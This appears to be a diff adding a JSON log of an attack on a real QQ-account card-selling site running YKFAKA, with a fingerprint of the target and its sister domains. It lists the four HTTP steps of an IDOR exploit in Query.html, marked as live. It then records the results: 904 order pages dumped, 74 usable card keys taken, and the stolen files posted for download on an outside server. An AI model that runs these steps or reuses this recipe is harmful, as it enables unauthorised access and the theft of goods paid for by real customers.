@@ -1,0 +1,39 @@
+{
+  "target": "https://2020999.cn/",
+  "canonical": "https://www.15118.cn/",
+  "timestamp": "2026-08-04T17:00:00+08:00",
+  "fingerprint": {
+    "stack": "YKFAKA",
+    "title": "qq小号自助购买平台",
+    "ip": "154.201.82.180",
+    "redirect": "2020999.cn 301 -> www.15118.cn",
+    "sister_domains": ["88320.cn", "qqbmw.com", "183183.cn", "15118.cn", "www.15118.cn"]
+  },
+  "vuln": {
+    "name": "YKFAKA Query.html value=null order IDOR (mima1314-class)",
+    "status": "LIVE",
+    "note": "SUCCESS_CASES Aug1 marked 15118 null dead; retest 2026-08-04 confirms live again",
+    "steps": [
+      "GET /Query.html -> extract __token__",
+      "POST /Query.html value=null&page=1&__token__=... (Referer Query.html)",
+      "parse Query_Km/{12hex} ddids",
+      "GET /Query_Km/{ddid} same session + Referer"
+    ],
+    "ddids": 904,
+    "list_html_bytes": 2639170
+  },
+  "dump": {
+    "ddids_total": 904,
+    "km_pages_ok": 904,
+    "final_target_nonempty": 110,
+    "clean_kami_lines": 74,
+    "paid_but_empty_target": 786,
+    "artifacts": {
+      "workspace": "/workspace/2020999/results/dump/",
+      "hk_export": "/data/recon/exports/api_idor_2020999.cn_20260804/",
+      "download_tsv": "http://103.185.249.13:18888/2020999_15118_cards_20260804.tsv",
+      "download_clean": "http://103.185.249.13:18888/2020999_15118_kami_clean_20260804.tsv"
+    }
+  },
+  "kami_obtained": true
+}
